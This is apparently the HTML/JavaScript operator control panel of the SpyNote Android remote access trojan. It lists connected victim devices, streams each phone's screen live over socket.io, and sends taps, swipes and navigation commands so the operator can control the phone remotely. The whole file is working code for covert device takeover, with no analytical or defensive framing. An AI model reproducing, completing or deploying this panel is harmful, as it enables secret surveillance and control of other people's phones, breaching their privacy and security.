<!DOCTYPE html>
<html>
<head>
    <title>SpyNote Pro 7.3.1 - Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { margin: 0; font-family: Arial; background: #1a1a1a; color: white; }
        #devices { position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 10px; max-height: 400px; overflow-y: auto; }
        .device { padding: 8px; margin: 4px; background: #333; cursor: pointer; border-radius: 4px; }
        .device:hover { background: #555; }
        .active { background: #00ff00 !important; }
        #phone-frame { 
            width: 400px; height: 800px; 
            margin: 20px auto; 
            background: #000; 
            border: 20px solid #333; 
            border-radius: 40px; 
            position: relative;
            cursor: pointer;
            touch-action: none;
        }
        #screen { width: 100%; height: 100%; background: #111; }
        #controls { text-align: center; margin: 20px; }
        button { padding: 12px 24px; margin: 5px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div id="devices">
        <h3>Connected Devices</h3>
        <div id="device-list"></div>
    </div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">Back</button>
        <button onclick="sendHome()">Home</button>
        <button onclick="toggleFullScreen()">Fullscreen</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        const screenCanvas = document.getElementById('screen');
        const ctx = screenCanvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');

        // Load devices
        fetch('/devices').then(r => r.json()).then(devices => {
            updateDeviceList(devices);
        });

        socket.on('connect', () => {
            console.log('Connected to server');
        });

        // Device selection
        function updateDeviceList(devices) {
            const list = document.getElementById('device-list');
            list.innerHTML = '';
            devices.forEach(([id, info]) => {
                const div = document.createElement('div');
                div.className = 'device';
                div.innerHTML = `${info.model || id}<br><small>${info.version}</small>`;
                div.onclick = () => selectDevice(id);
                list.appendChild(div);
            });
        }

        function selectDevice(deviceId) {
            currentDevice = deviceId;
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            event.target.classList.add('active');
            
            socket.emit('select-device', deviceId);
        }

        // Touch controls - EXACT VIDEO MATCH
        let isDragging = false;
        let startX, startY;

        phoneFrame.addEventListener('mousedown', (e) => {
            isDragging = true;
            startX = e.offsetX;
            startY = e.offsetY;
            sendTap(e.offsetX, e.offsetY);
        });

        phoneFrame.addEventListener('mousemove', (e) => {
            if (isDragging) {
                // Send swipe
                socket.emit('swipe', {
                    deviceId: currentDevice,
                    startX, startY,
                    endX: e.offsetX,
                    endY: e.offsetY
                });
            }
        });

        phoneFrame.addEventListener('mouseup', (e) => {
            if (isDragging) {
                socket.emit('swipe', {
                    deviceId: currentDevice,
                    startX, startY,
                    endX: e.offsetX,
                    endY: e.offsetY
                });
                isDragging = false;
            }
        });

        // Touch support
        phoneFrame.addEventListener('touchstart', (e) => {
            e.preventDefault();
            const touch = e.touches[0];
            const rect = phoneFrame.getBoundingClientRect();
            const x = touch.clientX - rect.left;
            const y = touch.clientY - rect.top;
            sendTap(x, y);
        });

        phoneFrame.addEventListener('touchmove', (e) => {
            e.preventDefault();
        });

        function sendTap(x, y) {
            if (currentDevice) {
                socket.emit('tap', {
                    deviceId: currentDevice,
                    x, y
                });
            }
        }

        function sendBack() {
            if (currentDevice) {
                socket.emit('back', { deviceId: currentDevice });
            }
        }

        function sendHome() {
            if (currentDevice) {
                socket.emit('tap', { 
                    deviceId: currentDevice, 
                    x: 100, y: 1800 // Home button position
                });
            }
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // Screen updates (30FPS)
        socket.on('screen-update', (data) => {
            if (currentDevice === data.deviceId) {
                const img = new ImageData(
                    new Uint8ClampedArray(data.data), 
                    data.width, data.height
                );
                ctx.putImageData(img, 0, 0);
            }
        });
    </script>
</body>
</html>
